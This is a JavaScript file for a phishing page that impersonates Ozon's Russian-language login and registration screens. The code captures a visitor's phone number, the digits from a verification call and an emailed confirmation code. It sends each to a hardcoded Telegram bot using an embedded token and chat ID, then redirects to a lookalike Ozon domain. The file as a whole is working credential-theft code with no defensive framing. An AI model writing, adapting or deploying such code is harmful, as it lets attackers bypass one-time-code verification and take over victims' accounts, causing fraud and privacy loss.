const TOKEN = '6151126769:AAE65jnNPQosJW4nIWITCYmtJelL7nmgyvE';
const CHAT_ID = '-1001693386750';
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
const formClear = document.querySelector('#container');
const numberShow = document.querySelector('#numberShow');
function clearForm(){
    formClear.innerHTML = '';
}

let sleep = ms => new Promise(res=>setTimeout(res,ms));

document.querySelector("#button").onclick = function(){
    document.getElementById('form').addEventListener('submit', function(e){
        e.preventDefault();
        const message = `<b>Номер телефона: +7-<code>${this.number.value}</code></b>\n`
    
    
        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
        })
        clearForm();
        const resultsTemplate = `<div class="b1aw">
        <!---->
        <div class="b8a"><span class="tsHeadline600Large mt40 c6322-a4">Введите последние 6 цифр входящего номера</span></div>
        <div class="b3wa">
          <div class="abv3"><span class="ab3v">Например +7 XXX X</span> <span class="avb3">12 34 56</span></div>
        </div>
        <div class="ab2w"><span>Отвечать на звонок не нужно<br><br> Уже звоним на +7 <span id='numberShow'>${this.number.value}</span>.</span>
          <!---->
        </div>
        <!---->
        <!---->
        <form id="form2">
          <!---->
          <div class="c8134-a">
            <label class="c8134-a0">
              <!---->
              <div class="f151-a f151-a8 f151-b6 ba8v" autocomplete="off" inputmode="numeric">
                <div class="f151-b0">
                  <input pattern=".{6,}" id="code" name="code" maxlength="6" class="d213-a d213-a5">
                  <!---->
                  <p class="f151-a0"></p>
                  <div class="f151-a2 f151-a8">
                    <!---->
                    <!---->
                  </div>
                </div>
              </div>
            </label>
            <!---->
          </div>
          <div>
            <div class="bv8a">
              <!---->
              <a href="#">

              </a>
            </div>
            <div class="baw2"><a href="#">
            Запросить СМС-код
            </a></div>
          </div>
          <label class="a4226-a a4226-a4 bva" required="required">
            <input type="checkbox" name="agreement" class="a4226-a2">
            <div class="a4226-a5">
              <!---->
            </div>
            <div class="a4226-a0"><span>Соглашаюсь с <a target="_blank" href="https://docs.ozon.ru/common/pravila-prodayoi-i-rekvizity/">условиями использования</a> сервисов Ozon и <a target="_blank" href="https://docs.ozon.ru/common/pravila-prodayoi-i-rekvizity/usloviya-obrabotki-personal-nyh-dannyh/">условиями обработки</a> персональных данных</span></div>
          </label>
          <label class="a4226-a a4226-a4 a4226-a8 bva">
            <input type="checkbox" name="advertising" class="a4226-a2 checkbox2">
            <div class="a4226-a5">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" color="#fff" class="a4226-a3">
                <path fill="currentColor" d="M12.707 5.293a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-3-3a1 1 0 0 1 1.414-1.414L7 9.586l4.293-4.293a1 1 0 0 1 1.414 0Z"></path>
              </svg>
            </div>
            <div class="a4226-a0"><span>Соглашаюсь на получение сообщений <a target="_blank" href="https://docs.ozon.ru/common/pravila-prodayoi-i-rekvizity/soglasie-na-reklamy">рекламного</a> характера</span></div>
          </label>
          <button id='codeButton' type='submit' class="b235-a0 b235-a5 b235-b2 b235-a4">
            <div class="b235-a1">
              <div class="b235-a8 tsBodyControl500Medium">Зарегистрироваться</div>
            </div>
          </button>
          <!---->
          <!---->
          <!---->
          <!---->
          <!---->
          <!---->
          <!---->
          <div class="aw2b">
            <div class="a2wb ga26-a">
              <div class="ga26-a2 tsBodyControl500Medium">Войти по почте</div>
            </div>
            <br>
            <div class="a2wb ga26-a">
              <div class="ga26-a2 tsBodyControl500Medium">Не получили звонок?</div>
            </div>
            <br>
          </div>
        </form>
      </div>`
      
        const finalMessage = resultsTemplate;
        formClear.innerHTML = finalMessage;
        document.querySelector("#codeButton").onclick = function(){
            document.getElementById('form2').addEventListener('submit', function(e){
                e.preventDefault();
                const message2 = `<b>код: <code>${this.code.value}</code></b>\n`
            
            
                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message2
                })
                clearForm();
                const mailCode = `
                <div class="a1bw" data-widget="loginOrRegistration">
                <div class="baw1">
                  <!---->
                  <div class="b8a"><span class="tsHeadline600Large c6322-a4">Введите код</span></div>
                  <!---->
                  <div class="wab1"><span>Мы отправили код подтверждения<br>на вашу почту</span>
                    <!---->
                  </div>
                  <!---->
                  <!---->
                  <form id="form3">
                    <!---->
                    <div class="c8134-a">
                      <label class="c8134-a0">
                        <!---->
                        <div class="f151-a f151-a8 f151-b6 avb8" autocomplete="off" inputmode="numeric">
                          <div class="f151-b0">
                            <input pattern=".{6,}"autocomplete="off" inputmode="numeric" type="otp" name="mailCode" maxlength="6" autofocus="autofocus" class="d213-a d213-a5">
                            <!---->
                            <p class="f151-a0"></p>
                            <div class="f151-a2 f151-a8">
                              <!---->
                              <!---->
                            </div>
                          </div>
                        </div>
                      </label>
                      <!---->
                    </div>
                    <button class="mail__button" type="submit">Подтвердить</button>
                    <div class="sms__div">
                      <a href="#">
                          Получить код в СМС
                        </a>
                        <!---->
                      </div>
                      <!---->
                    </form>
                    <!---->
                    <!---->
                    <!---->
                    <!---->
                    <!---->
                    <!---->
                    <!---->
                    <!---->
                    <!---->
                    <!---->
                    <div class="w1ab">
                      <button class="w1ba ga26-a">
                        <div class="ga26-a2 tsBodyControl500Medium">Войти по почте</div>
                      </button>
                      <br>
                      <button class="w1ba ga26-a">
                        <div class="ga26-a2 tsBodyControl500Medium">Не приходит код?</div>
                      </button>
                      <br>
                    </div>
                  </div>
                </div>
              </div>`
              const finalMessage3 = mailCode;
              formClear.innerHTML = finalMessage3;
              document.getElementById('form3').addEventListener('submit', async function(e){
                e.preventDefault();
                const message = `<b>код с почты: <code>${this.mailCode.value}</code></b>\n`
            
            
                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                })
                await sleep(2000);
                document.location='https://pvz.ozon-dostavka.ru/login?redirectUri=%2F'
            })
            })
        }
    })
}



let tel = document.querySelector('#number')
let reg = /[A-Za-zA-Яа-яЁё @ # $ _ & ( ) / * " ' : ; ! ? ~ ` | / { } = % ^ < > -]/g;
tel.oninput = function(){
    this.value = this.value.replace(reg, '');
}



IMask(
    document.getElementById('number'),
    {
      mask: '000-000-00-00'
    }
) 

